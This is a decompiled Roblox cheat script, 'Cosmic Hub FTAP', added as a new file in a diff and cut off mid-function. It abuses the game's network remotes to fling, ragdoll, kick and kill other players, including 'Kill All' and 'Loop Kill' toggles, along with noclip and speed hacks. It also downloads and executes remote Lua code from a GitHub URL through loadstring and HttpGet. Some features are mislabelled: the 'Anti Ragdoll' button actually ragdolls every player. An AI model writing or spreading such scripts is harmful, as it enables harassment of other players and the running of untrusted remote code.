@@ -1,0 +1,4143 @@
+-- ts file was generated at discord.gg/25ms
+
+local _Players = game:GetService('Players')
+local _LocalPlayer = _Players.LocalPlayer
+local _RunService = game:GetService('RunService')
+local _HttpService = game:GetService('HttpService')
+local _ReplicatedStorage = game:GetService('ReplicatedStorage')
+
+game:GetService('Debris')
+
+local _GrabEvents = _ReplicatedStorage:WaitForChild('GrabEvents')
+
+_ReplicatedStorage:WaitForChild('CharacterEvents')
+_ReplicatedStorage:WaitForChild('MenuToys')
+
+local _SetNetworkOwner = _GrabEvents:WaitForChild('SetNetworkOwner')
+
+game:GetService('StarterGui')
+
+local _TextChatService = game:GetService('TextChatService')
+
+if not (_Players.LocalPlayer or _Players:GetPropertyChangedSignal('LocalPlayer'):Wait()) then
+    local _ = _Players.LocalPlayer
+end
+
+local _RagdollRemote = _ReplicatedStorage:WaitForChild('CharacterEvents'):FindFirstChild('RagdollRemote')
+local u10 = false
+
+if not _LocalPlayer.Character then
+    _LocalPlayer.CharacterAdded:Wait()
+end
+
+workspace:FindFirstChild(_LocalPlayer.Name .. 'SpawnedInToys')
+
+local _LocalPlayer2 = _Players.LocalPlayer
+local _Workspace = game:GetService('Workspace');
+
+(_G or {}).BlobmanDelay = 5e-8
+
+local u13 = 1
+local u14 = nil
+local u15 = {}
+
+function getAllPlayers()
+    local v16 = _Players
+    local v17, v18, v19 = ipairs(v16:GetPlayers())
+    local v20 = {}
+
+    while true do
+        local v21
+
+        v19, v21 = v17(v18, v19)
+
+        if v19 == nil then
+            break
+        end
+
+        table.insert(v20, v21.Name)
+    end
+
+    return v20
+end
+function registerDropdown(p22)
+    table.insert(u15, p22)
+    p22:Refresh(getAllPlayers(), true)
+end
+function sendChatMessage(p23)
+    if _TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
+        _ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(p23, 'All')
+    else
+        _TextChatService.TextChannels.RBXGeneral:SendAsync(p23)
+    end
+end
+
+task.spawn(function()
+    sendChatMessage('-`C\u{b4}-')
+end)
+
+local u24 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Jeffepicy/OrionGod/refs/heads/main/CosmicOrion', true))()
+local v25 = u24
+
+u24.MakeNotification(v25, {
+    Name = 'Welcome to Cosmic Hub!',
+    Content = 'You\u{2019}re Whitelisted! wink wink',
+    Image = 'rbxassetid://4483345998',
+    Time = 20,
+})
+
+local v26 = u24
+local v27 = u24.MakeWindow(v26, {
+    Name = 'Cosmic Hub FTAP',
+    HidePremium = false,
+    SaveConfig = true,
+    ConfigFolder = 'CosmicHubFTAPConfig',
+})
+local v28 = v27:MakeTab({
+    Name = 'Player',
+    Icon = 'rbxassetid://6031075927',
+    PremiumOnly = false,
+})
+
+v28:AddSection({
+    Name = 'Movement',
+})
+
+local u29 = {
+    Walkspeed = false,
+    WalkspeedValue = 5,
+    InfiniteJump = false,
+    InfiniteJumpPower = 100,
+    Noclip = false,
+    Connections = {},
+}
+local _UserInputService = game:GetService('UserInputService')
+
+function u29.WalkspeedFunc()
+    if u29.Connections.WS then
+        u29.Connections.WS:Disconnect()
+    end
+    if u29.Walkspeed then
+        u29.Connections.WS = _RunService.Stepped:Connect(function()
+            p = _Players.LocalPlayer
+
+            if p and p.Character and (p.Character:FindFirstChild('HumanoidRootPart') and (p.Character:FindFirstChildOfClass('Humanoid') and typeof(u29.WalkspeedValue) == 'number')) then
+                h = p.Character.HumanoidRootPart
+                u = p.Character:FindFirstChildOfClass('Humanoid')
+                h.CFrame = h.CFrame + u.MoveDirection * (16 * u29.WalkspeedValue / 10)
+            end
+        end)
+    end
+end
+function u29.InfiniteJumpFunc()
+    if u29.Connections.JP then
+        u29.Connections.JP:Disconnect()
+    end
+    if u29.InfiniteJump then
+        u29.Connections.JP = _UserInputService.JumpRequest:Connect(function()
+            local _LocalPlayer3 = _Players.LocalPlayer
+
+            if _LocalPlayer3 and _LocalPlayer3.Character and _LocalPlayer3.Character:FindFirstChildOfClass('Humanoid') then
+                local _Humanoid = _LocalPlayer3.Character:FindFirstChildOfClass('Humanoid')
+
+                _Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                task.wait()
+                _Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+
+                if _Humanoid.UseJumpPower == false then
+                    _Humanoid.JumpHeight = math.clamp(u29.InfiniteJumpPower / 10, 7.2, 50)
+                else
+                    _Humanoid.JumpPower = u29.InfiniteJumpPower
+                end
+            end
+        end)
+    end
+end
+function u29.NoclipFunc()
+    if u29.Connections.NC then
+        u29.Connections.NC:Disconnect()
+    end
+    if u29.Noclip then
+        u29.Connections.NC = _RunService.Stepped:Connect(function()
+            p = _Players.LocalPlayer
+
+            if p and p.Character then
+                local v33, v34, v35 = ipairs(p.Character:GetDescendants())
+
+                while true do
+                    local v36
+
+                    v35, v36 = v33(v34, v35)
+
+                    if v35 == nil then
+                        break
+                    end
+                    if v36:IsA('BasePart') then
+                        v36.CanCollide = false
+                    end
+                end
+            end
+        end)
+    end
+end
+
+v28:AddToggle({
+    Name = 'Walkspeed',
+    Default = false,
+    Callback = function(p37)
+        u29.Walkspeed = p37
+
+        u29.WalkspeedFunc()
+    end,
+})
+v28:AddSlider({
+    Name = 'Speed Multiplier',
+    Min = 1,
+    Max = 5,
+    Default = 0.1,
+    Increment = 0.1,
+    Callback = function(p38)
+        u29.WalkspeedValue = p38
+    end,
+})
+v28:AddToggle({
+    Name = 'Infinite Jump',
+    Default = false,
+    Callback = function(p39)
+        u29.InfiniteJump = p39
+
+        u29.InfiniteJumpFunc()
+    end,
+})
+v28:AddSlider({
+    Name = 'Jump Power',
+    Min = 16,
+    Max = 500,
+    Default = 16,
+    Increment = 1,
+    Callback = function(p40)
+        u29.InfiniteJumpPower = p40
+    end,
+})
+v28:AddToggle({
+    Name = 'Noclip',
+    Default = false,
+    Callback = function(p41)
+        u29.Noclip = p41
+
+        u29.NoclipFunc()
+    end,
+})
+
+local v42 = v27:MakeTab({
+    Name = 'Invincibility',
+    Icon = 'rbxassetid://4483362458',
+    PremiumOnly = false,
+})
+
+v42:AddSection({
+    Name = 'Anti',
+})
+
+function ragdollAllPlayers()
+    if _RagdollRemote then
+        local v43 = _Players
+        local v44, v45, v46 = pairs(v43:GetPlayers())
+
+        while true do
+            local v47
+
+            v46, v47 = v44(v45, v46)
+
+            if v46 == nil then
+                break
+            end
+            if v47.Character and v47.Character:FindFirstChild('HumanoidRootPart') then
+                for _ = 1, 150 do
+                    _RagdollRemote:FireServer(v47.Character.HumanoidRootPart, 9999999)
+                    wait()
+                end
+            end
+        end
+    else
+        u24:MakeNotification({
+            Name = 'Error',
+            Content = 'error',
+            Image = 'rbxassetid://4483345998',
+            Time = 3,
+        })
+    end
+end
+
+v42:AddButton({
+    Name = 'Anti Ragdoll/Snowball',
+    Callback = function()
+        ragdollAllPlayers()
+    end,
+})
+v42:AddButton({
+    Name = 'Destroy Void',
+    Callback = function()
+        _Workspace.FallenPartsDestroyHeight = -1e95
+    end,
+})
+
+local u58 = {
+    Players = game:GetService('Players'),
+    ReplicatedStorage = game:GetService('ReplicatedStorage'),
+    RunService = game:GetService('RunService'),
+    LP = game.Players.LocalPlayer,
+    spawnGucci = function()
+        return u58.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer('CreatureBlobman', CFrame.new(0, 50000, 0) * CFrame.Angles(-0.7351, 0.9028, 0.6173), Vector3.new(0, 59.667, 0))
+    end,
+    setup = function()
+        u58.spawnGucci()
+
+        local _Name = u58.LP.Name
+        local u49 = _Workspace
+        local v50 = u58.LP.Character or u58.LP.CharacterAdded:Wait()
+        local v51 = u49:FindFirstChild(_Name .. 'SpawnedInToys')
+        local v52 = nil
+        local v53
+
+        if v51 then
+            v53 = v51:FindFirstChild('CreatureBlobman')
+        else
+            v53 = nil
+        end
+        if v53 then
+            v52 = v53:FindFirstChild('Head')
+        end
+        if v52 then
+            v52.CFrame = CFrame.new(0, 50000, 0)
+            v52.Anchored = true
+        end
+
+        task.wait(0.1)
+
+        local _Humanoid2 = v50:WaitForChild('Humanoid')
+        local _HumanoidRootPart = v50:WaitForChild('HumanoidRootPart')
+        local _Position = _HumanoidRootPart.Position
+        local u57 = false
+
+        if v53 then
+            v53 = v53:FindFirstChild('VehicleSeat')
+        end
+        if v53 and v53:IsA('VehicleSeat') then
+            _HumanoidRootPart.CFrame = v53.CFrame + Vector3.new(0, 2, 0)
+
+            v53:Sit(_Humanoid2)
+
+            u57 = true
+        end
+
+        _Humanoid2:GetPropertyChangedSignal('Jump'):Connect(function()
+            if u57 and _Humanoid2.Jump then
+                task.wait(0.02)
+
+                _HumanoidRootPart.CFrame = CFrame.new(_Position)
+                u57 = false
+            end
+        end)
+
+        u58.ragdollConn = u58.RunService.Heartbeat:Connect(function()
+            if u58.enabled and u57 then
+                pcall(function()
+                    u58.ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(u49[_Name].HumanoidRootPart, 0)
+                end)
+            end
+        end)
+        u58.posCheckConn = u58.RunService.Heartbeat:Connect(function()
+            if u58.enabled and (_HumanoidRootPart.Position - _Position).Magnitude < 1 then
+                u57 = false
+            end
+        end)
+    end,
+}
+
+v42:AddToggle({
+    Name = ' Gucci Anti',
+    Default = false,
+    Callback = function(p59)
+        u58.enabled = p59
+
+        if p59 then
+            u58.setup()
+        else
+            if u58.ragdollConn then
+                u58.ragdollConn:Disconnect()
+
+                u58.ragdollConn = nil
+            end
+            if u58.posCheckConn then
+                u58.posCheckConn:Disconnect()
+
+                u58.posCheckConn = nil
+            end
+        end
+    end,
+})
+v42:AddButton({
+    Name = 'Destroy Gucci (All)',
+    Callback = function()
+        local v60, v61, v62 = _Workspace:GetDescendants()
+
+        while true do
+            local v63
+
+            v62, v63 = v60(v61, v62)
+
+            if v62 == nil then
+                break
+            end
+            if v63.Name == 'CreatureBlobman' then
+                v63.VehicleSeat:Sit(game.Players.LocalPlayer.Character.Humanoid)
+                wait(0.05)
+
+                game.Players.LocalPlayer.Character.Humanoid.Jump = true
+            end
+        end
+    end,
+})
+
+local u64 = false
+
+function antiGrab()
+    while u64 and task.wait() do
+        local v65 = _LocalPlayer2:FindFirstChild('IsHeld') and _LocalPlayer2.IsHeld.Value == true and _LocalPlayer2.Character
+        local v66 = v65 and v65:FindFirstChild('HumanoidRootPart')
+
+        if v66 then
+            v66.Anchored = true
+
+            while _LocalPlayer2.IsHeld.Value == true and u64 do
+                _ReplicatedStorage.CharacterEvents.Struggle:FireServer(_LocalPlayer2)
+                task.wait(0.001)
+            end
+
+            v66.Anchored = false
+        end
+    end
+end
+
+v42:AddToggle({
+    Name = 'Anti Grab',
+    Default = false,
+    Callback = function(p67)
+        u64 = p67
+
+        if u64 then
+            task.spawn(antiGrab)
+        end
+    end,
+})
+
+local u68 = false
+
+function antiExplodeF()
+    _Workspace.ChildAdded:Connect(function(p69)
+        local v70 = p69:IsA('Part') and (p69.Name == 'Part' and u68) and _LocalPlayer2.Character
+
+        if v70 then
+            local _HumanoidRootPart2 = v70:FindFirstChild('HumanoidRootPart')
+            local _RightArm = v70:FindFirstChild('Right Arm')
+
+            if _HumanoidRootPart2 and _RightArm and (p69.Position - _HumanoidRootPart2.Position).Magnitude <= 20 then
+                _HumanoidRootPart2.Anchored = true
+
+                task.wait(0.01)
+
+                while _RightArm:FindFirstChild('RagdollLimbPart') and _RightArm.RagdollLimbPart.CanCollide == true do
+                    task.wait(0.001)
+                end
+
+                _HumanoidRootPart2.Anchored = false
+            end
+        end
+    end)
+end
+
+v42:AddToggle({
+    Name = 'Anti Explode',
+    Default = false,
+    Callback = function(p73)
+        u68 = p73
+
+        if u68 then
+            task.spawn(antiExplodeF)
+        end
+    end,
+})
+v42:AddToggle({
+    Name = 'Anti Fire',
+    Default = false,
+    Callback = function(p74)
+        local u75 = {
+            p = game:GetService('Players').LocalPlayer,
+            rs = game:GetService('RunService'),
+            w = game:GetService('Workspace'),
+            mon = false,
+            con = nil,
+        }
+
+        u75.ep = u75.w.Map.Hole.PoisonBigHole.ExtinguishPart
+        u75.op = u75.ep.Position
+
+        function check()
+            local _HumanoidRootPart3 = (u75.p.Character or u75.p.CharacterAdded:Wait()):WaitForChild('HumanoidRootPart')
+            local _FireLight = _HumanoidRootPart3:FindFirstChild('FireLight')
+            local _FireParticleEmitter = _HumanoidRootPart3:FindFirstChild('FireParticleEmitter')
+
+            if _FireLight or _FireParticleEmitter then
+                u75.ep.CFrame = CFrame.new(_HumanoidRootPart3.Position)
+
+                while _FireLight or _FireParticleEmitter do
+                    task.wait(0.1)
+
+                    _FireLight = _HumanoidRootPart3:FindFirstChild('FireLight')
+                    _FireParticleEmitter = _HumanoidRootPart3:FindFirstChild('FireParticleEmitter')
+                    u75.ep.CFrame = CFrame.new(_HumanoidRootPart3.Position)
+                end
+
+                u75.ep.CFrame = CFrame.new(u75.op)
+            end
+        end
+
+        u75.mon = p74
+
+        if p74 then
+            if not u75.con then
+                u75.con = u75.rs.Heartbeat:Connect(function()
+                    if u75.mon then
+                        check()
+                    end
+                end)
+            end
+        else
+            u75.ep.CFrame = CFrame.new(u75.op)
+
+            if u75.con then
+                u75.con:Disconnect()
+
+                u75.con = nil
+            end
+        end
+    end,
+})
+
+function antiLagF()
+    local _Character = game.Players.LocalPlayer.Character
+
+    if _Character then
+        local _HumanoidRootPart4 = _Character:FindFirstChild('HumanoidRootPart')
+        local _Humanoid3 = _Character:FindFirstChild('Humanoid')
+        local _PlayerScripts = game.Players.LocalPlayer:FindFirstChild('PlayerScripts')
+
+        if _PlayerScripts then
+            _PlayerScripts = game.Players.LocalPlayer.PlayerScripts:FindFirstChild('CharacterAndBeamMove')
+        end
+        if _HumanoidRootPart4 and _Humanoid3 and _PlayerScripts then
+            _PlayerScripts.Disabled = antiLagT
+        end
+    end
+end
+
+v42:AddToggle({
+    Name = 'Anti Lag',
+    Default = false,
+    Callback = function(p83)
+        antiLagT = p83
+
+        antiLagF()
+    end,
+})
+
+function removeDetectors()
+    local _Character2 = _LocalPlayer.Character
+
+    if _Character2 then
+        local _HumanoidRootPart5 = _Character2:FindFirstChild('HumanoidRootPart')
+
+        if _HumanoidRootPart5 then
+            local v86 = _Workspace
+            local v87, v88, v89 = pairs(v86:GetDescendants())
+
+            while true do
+                local v90
+
+                v89, v90 = v87(v88, v89)
+
+                if v89 == nil then
+                    break
+                end
+                if v90:IsA('BasePart') and (v90.Name == 'LeftDetector' or v90.Name == 'RightDetector') and (_HumanoidRootPart5.Position - v90.Position).Magnitude > 10 then
+                    v90:Destroy()
+                end
+            end
+        end
+    else
+        return
+    end
+end
+function applyAntiMassless()
+    while u10 do
+        if _LocalPlayer.Character then
+            local v91, v92, v93 = ipairs(_LocalPlayer.Character:GetDescendants())
+
+            while true do
+                local v94
+
+                v93, v94 = v91(v92, v93)
+
+                if v93 == nil then
+                    break
+                end
+                if v94:IsA('BasePart') and v94.Massless then
+                    v94.Massless = false
+                end
+            end
+        end
+
+        task.wait(1)
+    end
+end
+
+v42:AddToggle({
+    Name = 'Anti Blobman',
+    Default = false,
+    Callback = function(p95)
+        u10 = p95
+
+        if u10 then
+            task.spawn(function()
+                while u10 do
+                    removeDetectors()
+                    task.wait(1)
+                end
+            end)
+            task.spawn(applyAntiMassless)
+        end
+    end,
+})
+
+local v96 = v27:MakeTab({
+    Name = 'Attack',
+    Icon = 'rbxassetid://6031094674',
+    PremiumOnly = false,
+})
+
+v96:AddSection({
+    Name = 'Loop ',
+})
+
+local _Players2 = game:GetService('Players')
+local _RunService2 = game:GetService('RunService')
+local u99 = _Workspace
+local _ReplicatedStorage2 = game.ReplicatedStorage
+local _LocalPlayer4 = _Players2.LocalPlayer
+local u102 = {}
+local u103 = nil
+local u104 = {
+    E = false,
+    S = nil,
+    D = 2,
+    Off = Vector3.new(5, -18.5, 0),
+    H = 10000,
+    Del = 0.5,
+}
+local u105 = {
+    E = false,
+    S = nil,
+    D = 2,
+    Off = Vector3.new(5, -18.5, 0),
+    H = 10000,
+    Del = 0.5,
+}
+
+function upd(p106)
+    local v107 = _Players2
+    local v108, v109, v110 = ipairs(v107:GetPlayers())
+    local v111 = {}
+
+    while true do
+        local v112
+
+        v110, v112 = v108(v109, v110)
+
+        if v110 == nil then
+            break
+        end
+
+        table.insert(v111, v112.Name)
+    end
+
+    p106:Refresh(v111, true)
+end
+function nocoll(p113)
+    local v114, v115, v116 = ipairs(p113:GetDescendants())
+
+    while true do
+        local v117
+
+        v116, v117 = v114(v115, v116)
+
+        if v116 == nil then
+            break
+        end
+        if v117:IsA('BasePart') then
+            v117.CanCollide = false
+        end
+    end
+end
+function fling(p118, p119)
+    nocoll(p119.Parent)
+
+    local _BodyVelocity = Instance.new('BodyVelocity', p118)
+    local v121 = Vector3.new(0, 1000000000, 0)
+
+    _BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+    _BodyVelocity.Velocity = v121
+    p119.Jump = true
+    p119.Sit = false
+
+    task.delay(3, function()
+        if _BodyVelocity.Parent then
+            _BodyVelocity:Destroy()
+        end
+    end)
+end
+function above(p122, p123)
+    local _Character3 = p122.Character
+
+    if _Character3 then
+        _Character3 = p122.Character:FindFirstChild('HumanoidRootPart')
+    end
+
+    return (not _Character3 or p123 < _Character3.Position.Y) and true or false
+end
+function save(p125)
+    local _Character4 = _LocalPlayer4.Character
+
+    if _Character4 and _Character4:FindFirstChild('HumanoidRootPart') then
+        p125.S = _Character4:GetPivot()
+    end
+end
+function ret(p127)
+    local _Character5 = _LocalPlayer4.Character
+    local v129
+
+    if _Character5 then
+        v129 = _Character5:FindFirstChild('HumanoidRootPart')
+    else
+        v129 = _Character5
+    end
+    if v129 and p127.S and (v129.Position - p127.S.Position).Magnitude > p127.D then
+        _Character5:PivotTo(p127.S)
+    end
+end
+function act(p130, p131, p132)
+    if p131.E then
+        if u99:FindFirstChild('PlotItems') and u99.PlotItems.PlayersInPlots:FindFirstChild(p130.Name) then
+            return
+        else
+            local _Character6 = p130.Character
+            local u134
+
+            if _Character6 then
+                u134 = _Character6:FindFirstChild('HumanoidRootPart')
+            else
+                u134 = _Character6
+            end
+
+            local u135
+
+            if _Character6 then
+                u135 = _Character6:FindFirstChildOfClass('Humanoid')
+            else
+                u135 = _Character6
+            end
+
+            local u136
+
+            if _Character6 then
+                u136 = _Character6:FindFirstChild('Head')
+            else
+                u136 = _Character6
+            end
+            if u134 and u135 and (u136 and u135.Health > 0) and not above(p130, p131.H) then
+                local _Character7 = _LocalPlayer4.Character
+                local v138
+
+                if _Character7 then
+                    v138 = _Character7:FindFirstChild('HumanoidRootPart')
+                else
+                    v138 = _Character7
+                end
+                if v138 then
+                    pcall(function()
+                        save(p131)
+                        _Character7:PivotTo(CFrame.new(u134.Position + p131.Off))
+                        nocoll(_Character6)
+                        _ReplicatedStorage2.GrabEvents.SetNetworkOwner:FireServer(u134, u134.CFrame)
+                        task.wait()
+                        ret(p131)
+                        task.wait(0.1)
+                        _ReplicatedStorage2.GrabEvents.DestroyGrabLine:FireServer(u134)
+                        task.wait(0.1)
+
+                        if u136:FindFirstChild('PartOwner') and u136.PartOwner.Value == _LocalPlayer4.Name then
+                            fling(u134, u135)
+
+                            if p132 then
+                                task.wait(0.1)
+
+                                u135.Health = 0
+                            end
+                        end
+                    end)
+                    task.wait(p131.Del)
+                end
+            else
+                return
+            end
+        end
+    else
+        return
+    end
+end
+function loop(p139, p140)
+    save(p139)
+
+    local v141, v142, v143 = pairs(u102)
+
+    while true do
+        v143 = v141(v142, v143)
+
+        if v143 == nil or not p139.E then
+            break
+        end
+
+        local v144 = _Players2:FindFirstChild(v143)
+
+        if v144 then
+            act(v144, p139, p140)
+        end
+    end
+end
+function loopCtrl(p145, p146)
+    return _RunService2.Heartbeat:Connect(function()
+        if p145.E then
+            loop(p145, p146)
+        end
+    end)
+end
+
+local u147 = nil
+local u148 = nil
+local u149 = nil
+local u150 = nil
+
+function stop(p151, p152)
+    p152.E = false
+
+    if p151 then
+        p151:Disconnect()
+    end
+
+    p152.S = nil
+end
+
+SelectDropdown = v96:AddDropdown({
+    Name = 'Select Player',
+    Options = {},
+    Callback = function(p153)
+        u103 = _Players2:FindFirstChild(p153)
+    end,
+})
+LoopDropdown = v96:AddDropdown({
+    Name = 'Players in Loop',
+    Options = {},
+    Callback = function(p154)
+        u103 = _Players2:FindFirstChild(p154)
+    end,
+})
+
+v96:AddButton({
+    Name = 'Add Player',
+    Callback = function()
+        if u103 and not u102[u103.Name] then
+            u102[u103.Name] = true
+
+            upd(LoopDropdown)
+        end
+    end,
+})
+v96:AddButton({
+    Name = 'Remove Player',
+    Callback = function()
+        if u103 and u102[u103.Name] then
+            u102[u103.Name] = nil
+            u103 = nil
+
+            upd(SelectDropdown)
+            upd(LoopDropdown)
+        end
+    end,
+})
+v96:AddToggle({
+    Name = 'Loop Kick',
+    Callback = function(p155)
+        u104.E = p155
+
+        if p155 then
+            u147 = loopCtrl(u104, false)
+        else
+            stop(u147, u104)
+        end
+    end,
+})
+v96:AddToggle({
+    Name = 'Loop Kill',
+    Callback = function(p156)
+        u105.E = p156
+
+        if p156 then
+            u148 = loopCtrl(u105, true)
+        else
+            stop(u148, u105)
+        end
+    end,
+})
+_Players2.PlayerAdded:Connect(function()
+    upd(SelectDropdown)
+end)
+_Players2.PlayerRemoving:Connect(function(p157)
+    if u102[p157.Name] then
+        u102[p157.Name] = nil
+
+        upd(LoopDropdown)
+    end
+
+    upd(SelectDropdown)
+end)
+upd(SelectDropdown)
+upd(LoopDropdown)
+v96:AddToggle({
+    Name = 'Kick All',
+    Callback = function(p158)
+        if p158 then
+            stop(u147, u104)
+
+            u149 = _RunService2.Heartbeat:Connect(function()
+                save(u104)
+
+                local v159 = _Players2
+                local v160, v161, v162 = ipairs(v159:GetPlayers())
+
+                while true do
+                    local v163
+
+                    v162, v163 = v160(v161, v162)
+
+                    if v162 == nil then
+                        break
+                    end
+                    if v163 ~= _LocalPlayer4 then
+                        act(v163, u104, false)
+                    end
+                end
+            end)
+        else
+            stop(u149, u104)
+        end
+    end,
+})
+v96:AddToggle({
+    Name = 'Kill All',
+    Callback = function(p164)
+        if p164 then
+            stop(u148, u105)
+
+            u150 = _RunService2.Heartbeat:Connect(function()
+                save(u105)
+
+                local v165 = _Players2
+                local v166, v167, v168 = ipairs(v165:GetPlayers())
+
+                while true do
+                    local v169
+
+                    v168, v169 = v166(v167, v168)
+
+                    if v168 == nil then
+                        break
+                    end
+                    if v169 ~= _LocalPlayer4 then
+                        act(v169, u105, true)
+                    end
+                end
+            end)
+        else
+            stop(u150, u105)
+        end
+    end,
+})
+v96:AddSection({
+    Name = 'Grabs',
+})
+
+local u170 = false
+
+function killGrabF()
+    if u170 then
+        _Workspace.ChildAdded:Connect(function(p171)
+            if p171:IsA('Model') and (p171.Name == 'GrabParts' and u170) then
+                local _GrabPart = p171:FindFirstChild('GrabPart')
+
+                if _GrabPart and _GrabPart:FindFirstChild('WeldConstraint') then
+                    local _Part1 = _GrabPart.WeldConstraint.Part1
+                    local v174 = _Part1 and _Part1.Parent and _Part1.Parent ~= _LocalPlayer2.Character and _Part1.Parent:FindFirstChildOfClass('Humanoid')
+
+                    if v174 then
+                        v174.Health = 0
+                    end
+                end
+            end
+        end)
+    end
+end
+
+v96:AddToggle({
+    Name = 'Kill Grab',
+    Default = false,
+    Callback = function(p175)
+        u170 = p175
+
+        killGrabF()
+    end,
+})
+
+local u176 = {
+    S = game:GetService('UserInputService'),
+    A = game:GetService('ContextActionService'),
+    W = game:GetService('Workspace'),
+    R = game:GetService('RunService'),
+    D = game:GetService('Debris'),
+    P = game:GetService('Players'),
+    Enabled = false,
+    Strength = 800,
+    UI = {},
+}
+
+function onGrabAdded(p177)
+    if not u176.Enabled then
+        return
+    end
+    if p177.Name ~= 'GrabParts' then
+        return
+    end
+
+    local _GrabPart2 = p177:FindFirstChild('GrabPart')
+
+    if not (_GrabPart2 and _GrabPart2:FindFirstChild('WeldConstraint')) then
+        return
+    end
+
+    local _Part12 = _GrabPart2.WeldConstraint.Part1
+
+    if not _Part12 then
+        return
+    end
+
+    local _BodyVelocity2 = Instance.new('BodyVelocity')
+
+    _BodyVelocity2.MaxForce = Vector3.new(0, 0, 0)
+    _BodyVelocity2.Parent = _Part12
+
+    local v181 = nil
+    local u182 = nil
+    local u183 = nil
+    local u184 = nil
+
+    while true do
+        if v181 or not (p177.Parent and u176.Enabled) then
+            if v181 and u176.Enabled then
+                function launch()
+                    _BodyVelocity2.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                    _BodyVelocity2.Velocity = u176.W.CurrentCamera.CFrame.LookVector * u176.Strength
+                end
+
+                u182 = v181.MouseButton1Up:Connect(launch)
+                u183 = v181.MouseButton1Down:Connect(launch)
+            end
+
+            local _ = p177:GetPropertyChangedSignal('Parent'):Connect(function()
+                if not p177.Parent then
+                    if u182 then
+                        u182:Disconnect()
+                    end
+                    if u183 then
+                        u183:Disconnect()
+                    end
+                    if u184 then
+                        u184:Disconnect()
+                    end
+
+                    u176.D:AddItem(_BodyVelocity2, 1)
+                end
+            end)
+
+            return
+        end
+
+        local v185, v186, v187 = pairs(u176.P.LocalPlayer.PlayerGui.ContextActionGui:GetDescendants())
+
+        while true do
+            local v188
+
+            v187, v188 = v185(v186, v187)
+
+            if v187 == nil then
+                break
+            end
+            if v188:IsA('ImageLabel') and v188.Image == 'http://www.roblox.com/asset/?id=9603678090' then
+                v181 = v188.Parent
+
+                break
+            end
+        end
+
+        u176.R.Heartbeat:Wait()
+    end
+end
+function toggleConnections(p189)
+    if p189 then
+        u176.GrabConn = u176.W.ChildAdded:Connect(onGrabAdded)
+    elseif u176.GrabConn then
+        u176.GrabConn:Disconnect()
+
+        u176.GrabConn = nil
+    end
+end
+
+v96:AddToggle({
+    Name = 'Strength',
+    Default = false,
+    Callback = function(p190)
+        u176.Enabled = p190
+
+        toggleConnections(p190)
+    end,
+})
+v96:AddSlider({
+    Name = 'Launch Strength',
+    Min = 10,
+    Max = 3000,
+    Default = u176.Strength,
+    Increment = 50,
+    Callback = function(p191)
+        u176.Strength = p191
+    end,
+})
+
+local _LocalPlayer5 = game:GetService('Players').LocalPlayer
+
+v96:AddSection({
+    Name = 'Snowball Ragdoll',
+})
+
+local u193 = {
+    P = game:GetService('Players'),
+    RS = game:GetService('ReplicatedStorage'),
+    W = _Workspace,
+    LP = game.Players.LocalPlayer,
+    Toy = game:GetService('ReplicatedStorage'):WaitForChild('MenuToys'),
+    Set = game:GetService('ReplicatedStorage'):WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner'),
+    TP = nil,
+    TE = false,
+    SE = false,
+    AE = false,
+    DD = nil,
+    R = {},
+}
+
+function getAllPlayers()
+    local v194, v195, v196 = ipairs(u193.P:GetPlayers())
+    local v197 = {}
+
+    while true do
+        local v198
+
+        v196, v198 = v194(v195, v196)
+
+        if v196 == nil then
+            break
+        end
+        if v198 ~= u193.LP then
+            table.insert(v197, v198.Name)
+        end
+    end
+
+    return v197
+end
+function updateDropdown()
+    if u193.DD then
+        u193.DD:Refresh(getAllPlayers(), true)
+    end
+end
+
+u193.P.PlayerAdded:Connect(updateDropdown)
+u193.P.PlayerRemoving:Connect(updateDropdown)
+
+function spawnToy(p199, p200)
+    task.spawn(function()
+        local _SpawnToyRemoteFunction = u193.Toy:FindFirstChild('SpawnToyRemoteFunction')
+
+        if _SpawnToyRemoteFunction then
+            pcall(function()
+                _SpawnToyRemoteFunction:InvokeServer(p199, CFrame.new(p200), Vector3.new())
+            end)
+        end
+    end)
+end
+function tpSnow()
+    while u193.AE do
+        local v202 = u193.W:FindFirstChild(u193.LP.Name .. 'SpawnedInToys')
+
+        if v202 then
+            local v203, v204, v205 = pairs(u193.R)
+
+            while true do
+                local v206
+
+                v205, v206 = v203(v204, v205)
+
+                if v205 == nil then
+                    break
+                end
+
+                local _Character8 = v206.Character
+
+                if _Character8 then
+                    _Character8 = _Character8:FindFirstChild('HumanoidRootPart')
+                end
+                if _Character8 then
+                    local v208, v209, v210 = ipairs(v202:GetChildren())
+
+                    while true do
+                        local v211
+
+                        v210, v211 = v208(v209, v210)
+
+                        if v210 == nil then
+                            break
+                        end
+                        if v211:IsA('Model') and v211.Name == 'BallSnowball' then
+                            local v212, v213, v214 = ipairs(v211:GetDescendants())
+
+                            while true do
+                                local v215
+
+                                v214, v215 = v212(v213, v214)
+
+                                if v214 == nil then
+                                    break
+                                end
+                                if v215:IsA('BasePart') then
+                                    v215.Position = _Character8.Position
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+
+        task.wait(0.1)
+    end
+end
+function autoBlob()
+    while u193.AE do
+        u193.R = {}
+
+        local v216, v217, v218 = pairs(u193.P:GetPlayers())
+
+        while true do
+            local v219
+
+            v218, v219 = v216(v217, v218)
+
+            if v218 == nil then
+                break
+            end
+            if v219 ~= u193.LP and v219.Character then
+                local _Humanoid4 = v219.Character:FindFirstChildOfClass('Humanoid')
+
+                if _Humanoid4 and _Humanoid4.SeatPart and _Humanoid4.SeatPart.Parent.Name == 'CreatureBlobman' then
+                    table.insert(u193.R, v219)
+
+                    local _Character9 = u193.LP.Character
+
+                    if _Character9 then
+                        _Character9 = u193.LP.Character:FindFirstChild('HumanoidRootPart')
+                    end
+                    if _Character9 then
+                        spawnToy('BallSnowball', _Character9.Position + Vector3.new(0, 2, 0))
+                    end
+                end
+            end
+        end
+
+        task.wait(0.1)
+    end
+end
+function spawnBalls()
+    while u193.SE do
+        local _Character10 = u193.LP.Character
+
+        if _Character10 then
+            _Character10 = u193.LP.Character:FindFirstChild('HumanoidRootPart')
+        end
+        if _Character10 then
